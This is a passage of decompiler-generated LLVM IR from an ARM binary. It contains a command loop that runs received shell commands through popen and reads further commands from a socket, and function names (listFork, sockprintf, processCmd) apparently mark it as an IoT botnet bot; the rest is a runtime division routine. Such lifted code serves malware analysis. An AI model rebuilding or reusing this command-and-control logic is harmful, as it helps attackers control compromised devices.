  %v2_1200c35 = icmp eq i8 %v2_1200833, 0
  br i1 %v2_1200c35, label %dec_label_pc_12014, label %dec_label_pc_11fd8

dec_label_pc_11fd8:                               ; preds = %dec_label_pc_11fb4, %dec_label_pc_11fd8
  %storemerge737 = phi i8* [ %storemerge7, %dec_label_pc_11fd8 ], [ %v5_11ef4, %dec_label_pc_11fb4 ]
  %storemerge1636 = phi i32 [ %v1_11ffc, %dec_label_pc_11fd8 ], [ %v1_11ef0, %dec_label_pc_11fb4 ]
  %v2_11fdc = load i8, i8* %storemerge737, align 1
  %v3_11fdc = zext i8 %v2_11fdc to i32
  %v1_11fe4 = call i32 @__GI_toupper(i32 %v3_11fdc)
  %v1_11ff4 = trunc i32 %v1_11fe4 to i8
  store i8 %v1_11ff4, i8* %storemerge737, align 1
  %v1_11ffc = add i32 %storemerge1636, 1
  %storemerge7 = inttoptr i32 %v1_11ffc to i8*
  %v2_12008 = load i8, i8* %storemerge7, align 1
  %v2_1200c = icmp eq i8 %v2_12008, 0
  br i1 %v2_1200c, label %dec_label_pc_12014, label %dec_label_pc_11fd8

dec_label_pc_12014:                               ; preds = %dec_label_pc_11fd8, %dec_label_pc_11fb4
  store i32 ptrtoint ([5 x i8]* @global_var_1f890.1010 to i32), i32* @r1, align 4
  %v4_12020 = call i32 @__GI_strcoll(i8* %v5_11ef4, i32 ptrtoint ([5 x i8]* @global_var_1f890.1010 to i32))
  %v2_12028 = icmp eq i32 %v4_12020, 0
  br i1 %v2_12028, label %dec_label_pc_12030, label %dec_label_pc_12114

dec_label_pc_12030:                               ; preds = %dec_label_pc_12014
  %v0_12030 = call i32 @listFork()
  %v2_12038 = icmp eq i32 %v0_12030, 0
  br i1 %v2_12038, label %dec_label_pc_12040, label %dec_label_pc_1229c

dec_label_pc_12040:                               ; preds = %dec_label_pc_12030
  store i32 1024, i32* @r2, align 4
  %v3_12058 = call i32 @__GI_memset(i8* %v2_12058, i32 0)
  %v6_12078 = call i32 @szprintf(i32 %v2_12048, i32 ptrtoint ([8 x i8]* @global_var_1f898.1012 to i32), i32 %v1_11fc4, i32 %v2_12048, i32 ptrtoint (i32* @0 to i32))
  %v3_12094 = call i32 @fdpopen(i32 %v2_12048, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_1f8a0.1014, i32 0, i32 0))
  br label %dec_label_pc_120dc

dec_label_pc_120a4:                               ; preds = %dec_label_pc_120dc
  %v2_120b4 = call i32 @trim(i8* %v2_12058)
  store i32 1024, i32* @r2, align 4
  %v3_120d0 = call i32 @__GI_memset(i8* %v2_12058, i32 0)
  %v1_120d8 = call i32 @sleep(i32 1)
  br label %dec_label_pc_120dc

dec_label_pc_120dc:                               ; preds = %dec_label_pc_12040, %dec_label_pc_120a4
  %v4_120f4 = call i32 @fdgets(i32 %v2_12048, i32 1024, i32 %v3_12094, i32 %v2_12048)
  %v2_120fc = icmp eq i32 %v4_120f4, 0
  br i1 %v2_120fc, label %dec_label_pc_12104, label %dec_label_pc_120a4

dec_label_pc_12104:                               ; preds = %dec_label_pc_120dc
  %v1_12108 = call i32 @fdpclose(i32 %v3_12094)
  %v1_12110 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_12114

dec_label_pc_12114:                               ; preds = %dec_label_pc_12014, %dec_label_pc_12104
  store i32 %v1_11fc4, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1f8a4.1016 to i32), i32* @r1, align 4
  %v2_12128 = call i32 @__GI_strtok(i32 %v1_11fc4, i32 ptrtoint (i32* @global_var_1f8a4.1016 to i32))
  store i32 %v1_11ef0, i32* %stack_var_-136, align 4
  %v2_1222440 = icmp eq i32 %v2_12128, 0
  br i1 %v2_1222440, label %dec_label_pc_1222c, label %dec_label_pc_12140

dec_label_pc_12140:                               ; preds = %dec_label_pc_12114, %dec_label_pc_1220c
  %stack_var_-40.043.in = phi i32 [ %v2_12214, %dec_label_pc_1220c ], [ %v2_12128, %dec_label_pc_12114 ]
  %stack_var_-44.141 = phi i32 [ %stack_var_-44.0, %dec_label_pc_1220c ], [ 1, %dec_label_pc_12114 ]
  %stack_var_-40.043 = inttoptr i32 %stack_var_-40.043.in to i8*
  %v2_12144 = load i8, i8* %stack_var_-40.043, align 1
  %v7_12148 = icmp eq i8 %v2_12144, 10
  br i1 %v7_12148, label %dec_label_pc_1220c, label %dec_label_pc_12150

dec_label_pc_12150:                               ; preds = %dec_label_pc_12140
  store i32 %stack_var_-44.141, i32* @r4, align 4
  %v3_1215c = call i32 @strlen(i8* nonnull %stack_var_-40.043)
  %v1_12164 = add i32 %v3_1215c, 1
  %v1_1216c = call i32 @malloc(i32 %v1_12164)
  %v0_1217c = load i32, i32* @r4, align 4
  %v3_1217c = mul i32 %v0_1217c, 4
  %v2_12188 = add i32 %v2_1226c, %v3_1217c
  %v2_1218c = inttoptr i32 %v2_12188 to i32*
  store i32 %v1_1216c, i32* %v2_1218c, align 4
  %v3_12198 = mul i32 %stack_var_-44.141, 4
  %v2_121a4 = add i32 %v2_1226c, %v3_12198
  %v1_121a8 = inttoptr i32 %v2_121a4 to i32*
  %v2_121a8 = load i32, i32* %v1_121a8, align 4
  store i32 %v2_121a8, i32* @r4, align 4
  %v3_121b4 = call i32 @strlen(i8* nonnull %stack_var_-40.043)
  %v1_121bc = add i32 %v3_121b4, 1
  %v0_121c0 = load i32, i32* @r4, align 4
  store i32 %v1_121bc, i32* @r2, align 4
  %v2_121d0 = inttoptr i32 %v0_121c0 to i8*
  %v3_121d0 = call i32 @__GI_memset(i8* %v2_121d0, i32 0)
  %v2_121ec = load i32, i32* %v1_121a8, align 4
  %v4_121fc = call i32 @strcpy(i32 %v2_121ec, i8* nonnull %stack_var_-40.043)
  %v1_12204 = add i32 %stack_var_-44.141, 1
  br label %dec_label_pc_1220c

dec_label_pc_1220c:                               ; preds = %dec_label_pc_12140, %dec_label_pc_12150
  %stack_var_-44.0 = phi i32 [ %stack_var_-44.141, %dec_label_pc_12140 ], [ %v1_12204, %dec_label_pc_12150 ]
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1f8a4.1016 to i32), i32* @r1, align 4
  %v2_12214 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1f8a4.1016 to i32))
  %v2_12224 = icmp eq i32 %v2_12214, 0
  br i1 %v2_12224, label %dec_label_pc_1222c, label %dec_label_pc_12140

dec_label_pc_1222c:                               ; preds = %dec_label_pc_1220c, %dec_label_pc_12114
  %stack_var_-44.1.lcssa = phi i32 [ 1, %dec_label_pc_12114 ], [ %stack_var_-44.0, %dec_label_pc_1220c ]
  %v3_12238 = call i32 @processCmd(i32 %stack_var_-44.1.lcssa, i32* nonnull %stack_var_-136)
  %v7_12244 = icmp slt i32 %stack_var_-44.1.lcssa, 2
  br i1 %v7_12244, label %dec_label_pc_1229c, label %dec_label_pc_1225c.lr.ph

dec_label_pc_1225c.lr.ph:                         ; preds = %dec_label_pc_1222c
  br label %dec_label_pc_1225c

dec_label_pc_1225c:                               ; preds = %dec_label_pc_1225c.lr.ph, %dec_label_pc_1225c
  %storemerge17115 = phi i32 [ 1, %dec_label_pc_1225c.lr.ph ], [ %v1_12284, %dec_label_pc_1225c ]
  %v3_12264 = mul i32 %storemerge17115, 4
  %v2_12270 = add i32 %v2_1226c, %v3_12264
  %v1_12274 = inttoptr i32 %v2_12270 to i32*
  %v2_12274 = load i32, i32* %v1_12274, align 4
  %v1_1227c = call i32 @free(i32 %v2_12274)
  %v1_12284 = add nuw nsw i32 %storemerge17115, 1
  %v5_12298 = icmp slt i32 %v1_12284, %stack_var_-44.1.lcssa
  br i1 %v5_12298, label %dec_label_pc_1225c, label %dec_label_pc_1229c

dec_label_pc_1229c:                               ; preds = %dec_label_pc_1225c, %dec_label_pc_12030, %dec_label_pc_11e50, %dec_label_pc_11eac, %dec_label_pc_1222c, %dec_label_pc_11e00, %dec_label_pc_11a70
  %v2_122a0 = load i32, i32* @global_var_29910.71, align 4
  %v5_122bc = call i32 @recvLine(i32 %v2_122a0, i8* %v4_122bc, i32 4096, i32 %v2_122ac)
  %v3_122cc = icmp eq i32 %v5_122bc, -1
  br i1 %v3_122cc, label %dec_label_pc_11a54, label %dec_label_pc_11d28

; uselistorder directives
  uselistorder i32 %v5_122bc, { 1, 0 }
  uselistorder i32 %stack_var_-44.1.lcssa, { 2, 0, 1 }
  uselistorder i32 %v2_12214, { 1, 0 }
  uselistorder i8* %stack_var_-40.043, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-44.141, { 1, 3, 0, 2 }
  uselistorder i8* %storemerge7, { 1, 0 }
  uselistorder i32 %v1_11ffc, { 1, 0 }
  uselistorder i8* %storemerge737, { 1, 0 }
  uselistorder i32 %v1_11fc4, { 1, 2, 0 }
  uselistorder i32 %v2_11f3c, { 1, 2, 0 }
  uselistorder i8* %v5_11ef4, { 5, 0, 3, 2, 1, 4, 6, 8, 7 }
  uselistorder i32 %v1_11ef0, { 3, 0, 2, 1, 4, 5 }
  uselistorder i8* %storemerge8, { 0, 1, 3, 4, 2 }
  uselistorder i1 %v9_11d64, { 1, 0 }
  uselistorder i32 %v3_11d30, { 1, 0 }
  uselistorder i32 %storemerge14, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v3_11c50, { 1, 0 }
  uselistorder i32 %v1_11c34, { 1, 0 }
  uselistorder i32 %v1_11b0c, { 1, 2, 0, 3 }
  uselistorder i32 %v2_1226c, { 2, 0, 1 }
  uselistorder i32 %v2_12048, { 2, 3, 4, 1, 0 }
  uselistorder i8* %v4_122bc, { 3, 0, 1, 2 }
  uselistorder i32 %v2_122ac, { 6, 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 0, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_1f8a4.1016 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32, i32)* @fdgets, { 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @szprintf, { 247, 246, 245, 244, 243, 242, 241, 240, 239, 238, 237, 236, 235, 234, 233, 232, 231, 230, 229, 228, 227, 226, 225, 224, 223, 222, 221, 220, 219, 218, 217, 216, 215, 214, 213, 212, 211, 210, 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36 }
  uselistorder i32 ()* @listFork, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*)* @strstr, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* @global_var_29914.77, { 2, 3, 0, 4, 5, 6, 7, 1, 8 }
  uselistorder i32* @global_var_2fb94.80, { 0, 2, 3, 4, 5, 6, 7, 1, 8, 9 }
  uselistorder i32 (i32, i32)* @sockprintf, { 7, 6, 5, 4, 3, 2, 1, 8, 0 }
  uselistorder i32 (i32)* @__GI_inet_ntoa, { 3, 2, 1, 0 }
  uselistorder i32* @global_var_2fb88.587, { 0, 3, 1, 2 }
  uselistorder i32* @global_var_29910.71, { 2, 3, 4, 0, 1, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 (i32)* @sleep, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @srand, { 1, 0 }
  uselistorder i32 (i32*)* @__GI_time, { 7, 8, 9, 10, 11, 12, 13, 14, 0, 1, 2, 3, 4, 5, 6, 15, 16 }
  uselistorder i32 ()* @getBuild, { 1, 0 }
  uselistorder label %dec_label_pc_1229c, { 0, 4, 1, 3, 2, 5, 6 }
  uselistorder label %dec_label_pc_1225c, { 1, 0 }
  uselistorder label %dec_label_pc_1220c, { 1, 0 }
  uselistorder label %dec_label_pc_12140, { 1, 0 }
  uselistorder label %dec_label_pc_12114, { 1, 0 }
  uselistorder label %dec_label_pc_120dc, { 1, 0 }
  uselistorder label %dec_label_pc_11fd8, { 1, 0 }
  uselistorder label %dec_label_pc_11fb4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11fa4, { 1, 0 }
  uselistorder label %dec_label_pc_11f24, { 1, 0 }
  uselistorder label %dec_label_pc_11e8c, { 1, 0 }
  uselistorder label %dec_label_pc_11e50, { 1, 0 }
  uselistorder label %dec_label_pc_11d9c, { 1, 0 }
  uselistorder label %dec_label_pc_11d1c, { 1, 0 }
  uselistorder label %dec_label_pc_11c8c, { 1, 0 }
  uselistorder label %dec_label_pc_11c4c, { 1, 0 }
  uselistorder label %dec_label_pc_11b60, { 1, 0 }
  uselistorder label %dec_label_pc_11b18, { 1, 0 }
  uselistorder label %dec_label_pc_11a54, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11a38, { 2, 1, 0 }
  uselistorder label %dec_label_pc_118fc, { 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_12320 = add i32 %arg2, -1
  %v7_12320 = icmp eq i32 %arg2, 1
  br i1 %v7_12320, label %bb, label %bb80

bb:                                               ; preds = %entry
  %v2_12324 = load i32, i32* @r0, align 4
  ret i32 %v2_12324

bb80:                                             ; preds = %entry
  %v2_12320 = icmp eq i32 %arg2, 0
  br i1 %v2_12320, label %dec_label_pc_12408, label %dec_label_pc_1232c

dec_label_pc_1232c:                               ; preds = %bb80
  %v0_1232c = load i32, i32* @r0, align 4
  %tmp = icmp ugt i32 %v0_1232c, %arg2
  br i1 %tmp, label %dec_label_pc_12334, label %dec_label_pc_123c0

dec_label_pc_12334:                               ; preds = %dec_label_pc_1232c
  %v2_12334 = and i32 %v1_12320, %arg2
  %v4_12334 = icmp eq i32 %v2_12334, 0
  br i1 %v4_12334, label %dec_label_pc_123cc, label %dec_label_pc_1233c

dec_label_pc_1233c:                               ; preds = %dec_label_pc_12334
  %v3_1233c = icmp ult i32 %arg2, 536870912
  br i1 %v3_1233c, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_1233c
  %v4_12340 = mul i32 %arg2, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_1233c, %.thread
  %v0_12360.pr36.ph = phi i32 [ %v4_12340, %.thread ], [ %arg2, %dec_label_pc_1233c ]
  %storemerge135 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_1233c ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb83
  %v0_12360.pr36 = phi i32 [ %v4_12354, %bb83 ], [ %v0_12360.pr36.ph, %.preheader.preheader ]
  %v1_12358 = phi i32 [ %v4_12358, %bb83 ], [ %storemerge135, %.preheader.preheader ]
  %v2_1234c = icmp ugt i32 %v0_12360.pr36, 268435455
  br i1 %v2_1234c, label %.thread2, label %bb81

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_12360thread-pre-split.loopexit

bb81:                                             ; preds = %.preheader
  %v4_12350 = icmp ult i32 %v0_12360.pr36, %v0_1232c
  br i1 %v4_12350, label %bb82, label %dec_label_pc_12360thread-pre-split.loopexit.loopexit

bb82:                                             ; preds = %bb81
  %v2_12354 = and i32 %v0_12360.pr36, 268435456
  %v3_12354 = icmp eq i32 %v2_12354, 0
  %v4_12354 = mul i32 %v0_12360.pr36, 16
  br i1 %v3_12354, label %bb83, label %dec_label_pc_12360.loopexit

bb83:                                             ; preds = %bb82
  %v2_12358 = and i32 %v1_12358, 268435456
  %v3_12358 = icmp eq i32 %v2_12358, 0
  %v4_12358 = mul i32 %v1_12358, 16
  br i1 %v3_12358, label %.preheader, label %dec_label_pc_12360thread-pre-split.loopexit.loopexit

dec_label_pc_12360thread-pre-split.loopexit.loopexit: ; preds = %bb83, %bb81
  %v1_1236c48.ph = phi i32 [ %v1_12358, %bb81 ], [ %v4_12358, %bb83 ]
  %v0_12360.pr38.ph = phi i32 [ %v0_12360.pr36, %bb81 ], [ %v4_12354, %bb83 ]
  br label %dec_label_pc_12360thread-pre-split.loopexit

dec_label_pc_12360thread-pre-split.loopexit:      ; preds = %dec_label_pc_12360thread-pre-split.loopexit.loopexit, %.thread2
  %v1_1236c48 = phi i32 [ %v1_12358, %.thread2 ], [ %v1_1236c48.ph, %dec_label_pc_12360thread-pre-split.loopexit.loopexit ]
  %v0_12360.pr38 = phi i32 [ %v0_12360.pr36, %.thread2 ], [ %v0_12360.pr38.ph, %dec_label_pc_12360thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_12360thread-pre-split

dec_label_pc_12360thread-pre-split:               ; preds = %dec_label_pc_12360thread-pre-split.loopexit, %bb85
  %v1_1236c46 = phi i32 [ %v1_1236c48, %dec_label_pc_12360thread-pre-split.loopexit ], [ %v3_1236c, %bb85 ]
  %v0_12360.pr = phi i32 [ %v0_12360.pr38, %dec_label_pc_12360thread-pre-split.loopexit ], [ %v3_12368, %bb85 ]
  br label %dec_label_pc_12360

dec_label_pc_12360.loopexit:                      ; preds = %bb82
  br label %dec_label_pc_12360

dec_label_pc_12360:                               ; preds = %dec_label_pc_12360.loopexit, %dec_label_pc_12360thread-pre-split
  %v1_1236c = phi i32 [ %v1_1236c46, %dec_label_pc_12360thread-pre-split ], [ %v1_12358, %dec_label_pc_12360.loopexit ]
  %v1_12368 = phi i32 [ %v0_12360.pr, %dec_label_pc_12360thread-pre-split ], [ %v4_12354, %dec_label_pc_12360.loopexit ]
  %v2_12360 = icmp slt i32 %v1_12368, 0
  br i1 %v2_12360, label %dec_label_pc_12374, label %bb84

bb84:                                             ; preds = %dec_label_pc_12360
  %v4_12364 = icmp ult i32 %v1_12368, %v0_1232c
  br i1 %v4_12364, label %bb85, label %dec_label_pc_12374

bb85:                                             ; preds = %bb84
  %v3_12368 = mul i32 %v1_12368, 2
  %v2_1236c = icmp slt i32 %v1_1236c, 0
  %v3_1236c = mul i32 %v1_1236c, 2
  br i1 %v2_1236c, label %dec_label_pc_12374, label %dec_label_pc_12360thread-pre-split

dec_label_pc_12374:                               ; preds = %bb84, %dec_label_pc_12360, %bb85
  %v2_1238059 = phi i32 [ %v3_1236c, %bb85 ], [ %v1_1236c, %bb84 ], [ %v1_1236c, %dec_label_pc_12360 ]
  %v1_1237851 = phi i32 [ %v3_12368, %bb85 ], [ %v1_12368, %bb84 ], [ %v1_12368, %dec_label_pc_12360 ]
  br label %dec_label_pc_12378

dec_label_pc_12378:                               ; preds = %.thread11, %dec_label_pc_12374
  %v1_123ac = phi i32 [ %v4_123ac, %.thread11 ], [ %v2_1238059, %dec_label_pc_12374 ]
  %v1_12380 = phi i32 [ %v0_123b8, %.thread11 ], [ 0, %dec_label_pc_12374 ]
  %v1_123b0 = phi i32 [ %v4_123b0, %.thread11 ], [ %v1_1237851, %dec_label_pc_12374 ]
  %v1_1237c = phi i32 [ %v0_123a8, %.thread11 ], [ %v0_1232c, %dec_label_pc_12374 ]
  %v3_12378 = icmp ult i32 %v1_1237c, %v1_123b0
  br i1 %v3_12378, label %.thread7, label %bb86

bb86:                                             ; preds = %dec_label_pc_12378
  %v3_1237c = sub i32 %v1_1237c, %v1_123b0
  %v3_12380 = or i32 %v1_12380, %v1_123ac
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_12378, %bb86
  %v1_12388 = phi i32 [ %v1_1237c, %dec_label_pc_12378 ], [ %v3_1237c, %bb86 ]
  %v1_1238c = phi i32 [ %v1_12380, %dec_label_pc_12378 ], [ %v3_12380, %bb86 ]
  %v4_12384 = udiv i32 %v1_123b0, 2
  %v6_12384 = icmp ult i32 %v1_12388, %v4_12384
  br i1 %v6_12384, label %.thread8, label %bb87

bb87:                                             ; preds = %.thread7
  %v3_12388 = urem i32 %v1_123b0, 2
  %v4_12388 = icmp eq i32 %v3_12388, 0
  %v6_12388 = sub i32 %v1_12388, %v4_12384
  br i1 %v4_12388, label %.thread8, label %bb88

bb88:                                             ; preds = %bb87
  %v5_1238c = udiv i32 %v1_123ac, 2
  %v6_1238c = or i32 %v1_1238c, %v5_1238c
  br label %.thread8

.thread8:                                         ; preds = %bb87, %.thread7, %bb88
  %v1_12394 = phi i32 [ %v6_12388, %bb87 ], [ %v1_12388, %.thread7 ], [ %v6_12388, %bb88 ]
  %v1_12398 = phi i32 [ %v1_1238c, %bb87 ], [ %v1_1238c, %.thread7 ], [ %v6_1238c, %bb88 ]
  %v4_12390 = udiv i32 %v1_123b0, 4
  %v6_12390 = icmp ult i32 %v1_12394, %v4_12390
  br i1 %v6_12390, label %.thread9, label %bb89

bb89:                                             ; preds = %.thread8
  %v3_12394 = and i32 %v1_123b0, 2
  %v4_12394 = icmp eq i32 %v3_12394, 0
  %v6_12394 = sub i32 %v1_12394, %v4_12390
  br i1 %v4_12394, label %.thread9, label %bb90

bb90:                                             ; preds = %bb89
  %v5_12398 = udiv i32 %v1_123ac, 4
  %v6_12398 = or i32 %v1_12398, %v5_12398
  br label %.thread9

.thread9:                                         ; preds = %bb89, %.thread8, %bb90
  %v1_123a0 = phi i32 [ %v6_12394, %bb89 ], [ %v1_12394, %.thread8 ], [ %v6_12394, %bb90 ]
  %v1_123a4 = phi i32 [ %v1_12398, %bb89 ], [ %v1_12398, %.thread8 ], [ %v6_12398, %bb90 ]
  %v4_1239c = udiv i32 %v1_123b0, 8
  %v6_1239c = icmp ult i32 %v1_123a0, %v4_1239c
  br i1 %v6_1239c, label %thread-pre-split, label %bb91

bb91:                                             ; preds = %.thread9
  %v3_123a0 = and i32 %v1_123b0, 4
  %v4_123a0 = icmp eq i32 %v3_123a0, 0
  %v6_123a0 = sub i32 %v1_123a0, %v4_1239c
  br i1 %v4_123a0, label %thread-pre-split, label %bb92

bb92:                                             ; preds = %bb91
  %v5_123a4 = udiv i32 %v1_123ac, 8
  %v6_123a4 = or i32 %v1_123a4, %v5_123a4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb92, %.thread9, %bb91
  %v0_123b8 = phi i32 [ %v1_123a4, %bb91 ], [ %v1_123a4, %.thread9 ], [ %v6_123a4, %bb92 ]
  %v0_123a8 = phi i32 [ %v6_123a0, %bb91 ], [ %v1_123a0, %.thread9 ], [ %v6_123a0, %bb92 ]
  %v2_123a8 = icmp eq i32 %v0_123a8, 0
  br i1 %v2_123a8, label %dec_label_pc_123b8, label %bb93

bb93:                                             ; preds = %thread-pre-split
  %tmp140 = icmp ult i32 %v1_123ac, 16
  br i1 %tmp140, label %dec_label_pc_123b8, label %.thread11

.thread11:                                        ; preds = %bb93
  %v4_123ac = udiv i32 %v1_123ac, 16
  %v4_123b0 = udiv i32 %v1_123b0, 16
  br label %dec_label_pc_12378

dec_label_pc_123b8:                               ; preds = %thread-pre-split, %bb93
  ret i32 %v0_123b8

dec_label_pc_123c0:                               ; preds = %dec_label_pc_1232c
  %v9_1232c = icmp eq i32 %v0_1232c, %arg2
  %. = zext i1 %v9_1232c to i32
  ret i32 %.

dec_label_pc_123cc:                               ; preds = %dec_label_pc_12334
  %v2_123cc = icmp ugt i32 %arg2, 65535
  br i1 %v2_123cc, label %bb97, label %.thread16

bb97:                                             ; preds = %dec_label_pc_123cc
  %v2_123d0 = and i32 %arg2, 32768
  %v3_123d0 = icmp eq i32 %v2_123d0, 0
  %v4_123d0 = udiv i32 %arg2, 65536
  br i1 %v3_123d0, label %.thread16, label %bb98

.thread16:                                        ; preds = %bb97, %dec_label_pc_123cc
  %v0_123dc65 = phi i32 [ %arg2, %dec_label_pc_123cc ], [ %v4_123d0, %bb97 ]
  br label %bb98

bb98:                                             ; preds = %bb97, %.thread16
  %v1_123e0 = phi i32 [ %v0_123dc65, %.thread16 ], [ %v4_123d0, %bb97 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb97 ]
  %v2_123dc = icmp ugt i32 %v1_123e0, 255
  br i1 %v2_123dc, label %bb99, label %.thread17

bb99:                                             ; preds = %bb98
  %v2_123e0 = and i32 %v1_123e0, 128
  %v3_123e0 = icmp eq i32 %v2_123e0, 0
  %v4_123e0 = udiv i32 %v1_123e0, 256
  br i1 %v3_123e0, label %.thread17, label %bb100

bb100:                                            ; preds = %bb99
  %v2_123e4 = or i32 %storemerge, 8
  br label %.thread17

.thread17:                                        ; preds = %bb99, %bb98, %bb100
  %v1_123f0 = phi i32 [ %storemerge, %bb98 ], [ %storemerge, %bb99 ], [ %v2_123e4, %bb100 ]
  %v1_123ec = phi i32 [ %v1_123e0, %bb98 ], [ %v4_123e0, %bb99 ], [ %v4_123e0, %bb100 ]
  %v2_123e8 = icmp ugt i32 %v1_123ec, 15
  br i1 %v2_123e8, label %bb101, label %.thread18

bb101:                                            ; preds = %.thread17
  %v2_123ec = and i32 %v1_123ec, 8
  %v3_123ec = icmp eq i32 %v2_123ec, 0
  %v4_123ec = udiv i32 %v1_123ec, 16
  br i1 %v3_123ec, label %.thread18, label %bb102

bb102:                                            ; preds = %bb101
  %v2_123f0 = add nsw i32 %v1_123f0, 4
  br label %.thread18

.thread18:                                        ; preds = %bb101, %.thread17, %bb102
  %v4_123f8 = phi i32 [ %v1_123f0, %.thread17 ], [ %v1_123f0, %bb101 ], [ %v2_123f0, %bb102 ]
  %v5_123fc = phi i32 [ %v1_123ec, %.thread17 ], [ %v4_123ec, %bb101 ], [ %v4_123ec, %bb102 ]
  %v2_123f4 = icmp ugt i32 %v5_123fc, 3
  %v7_123f4 = icmp eq i32 %v5_123fc, 4
  %v2_123f8 = xor i1 %v7_123f4, true
  %v3_123f8 = and i1 %v2_123f4, %v2_123f8
  br i1 %v3_123f8, label %bb103, label %bb104

bb103:                                            ; preds = %.thread18
  %v5_123f8 = add nsw i32 %v4_123f8, 3
  br label %bb104

bb104:                                            ; preds = %.thread18, %bb103
  %v4_123fc = phi i32 [ %v4_123f8, %.thread18 ], [ %v5_123f8, %bb103 ]
  %v2_123fc = xor i1 %v2_123f4, true
  %v3_123fc = or i1 %v7_123f4, %v2_123fc
  br i1 %v3_123fc, label %bb105, label %bb106

bb105:                                            ; preds = %bb104
  %v8_123fc = udiv i32 %v5_123fc, 2
  %v9_123fc = add i32 %v4_123fc, %v8_123fc
  br label %bb106

bb106:                                            ; preds = %bb104, %bb105
  %v1_12400 = phi i32 [ %v4_123fc, %bb104 ], [ %v9_123fc, %bb105 ]
  %v6_12400 = lshr i32 %v0_1232c, %v1_12400
  ret i32 %v6_12400

dec_label_pc_12408:                               ; preds = %bb80
  %v0_12408 = load i32, i32* @lr, align 4
  %v0_1240c = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_12408)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_123fc, { 1, 0 }
  uselistorder i1 %v7_123f4, { 1, 0 }
  uselistorder i32 %v4_123ec, { 1, 0 }
  uselistorder i32 %v1_123ec, { 1, 0, 2, 3 }
  uselistorder i32 %v4_123e0, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_123e0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_123d0, { 1, 0 }
  uselistorder i32 %v0_123a8, { 1, 0 }
  uselistorder i32 %v4_1239c, { 1, 0 }
  uselistorder i32 %v1_123a4, { 1, 2, 0 }
  uselistorder i32 %v4_12390, { 1, 0 }
  uselistorder i32 %v1_12398, { 1, 2, 0 }
  uselistorder i32 %v4_12384, { 1, 0 }
  uselistorder i32 %v1_1238c, { 1, 2, 0 }
  uselistorder i32 %v1_123b0, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_12380, { 1, 0 }
  uselistorder i32 %v1_123ac, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_1236c, { 1, 0 }
  uselistorder i32 %v3_12368, { 1, 0 }
  uselistorder i32 %v1_12368, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_1236c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_12358, { 1, 0 }
  uselistorder i32 %v4_12354, { 2, 1, 0 }
  uselistorder i32 %v1_12358, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_12360.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v0_1232c, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %arg2, { 8, 12, 7, 6, 5, 10, 11, 0, 9, 1, 4, 2, 3 }
  uselistorder label %bb106, { 1, 0 }
